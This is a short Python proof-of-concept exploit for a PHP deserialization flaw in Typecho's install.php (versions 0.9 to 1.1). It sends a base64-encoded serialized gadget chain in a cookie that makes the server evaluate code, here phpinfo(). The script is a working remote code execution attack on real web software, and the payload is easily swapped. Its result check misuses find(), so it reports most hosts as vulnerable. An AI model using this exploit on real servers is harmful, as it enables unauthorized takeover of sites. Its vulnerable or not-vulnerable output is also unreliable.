#!/usr/bin/python

import sys
import requests
from requests.api import request


def poc(host):
    url = 'http://'+host+'/install.php?finish=1'
    print('Testing url:'+url)
    header = {
        'Cookie': '__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NToiYzF0YXMiO30=',
        'Referer': 'http://'+host+'/install.php'
    }
    try:
        r = requests.get(url, headers=header, timeout=10)
    except requests.exceptions.ConnectTimeout:
        print('Can\'t connect to the host')
        return False
    response = r.content.decode('utf-8')
    if response.find('phpinfo()'):
        print('The host is vulnerable to php_serialize_exploit (0.9 < typecho version < 1.1) !')
        return True
    else:
        print('The host is not vulnerable to php_serialize_exploit (0.9 < typecho version < 1.1) !')
        return False


if __name__ == '__main__':
    host = sys.argv[1]
    poc(host)


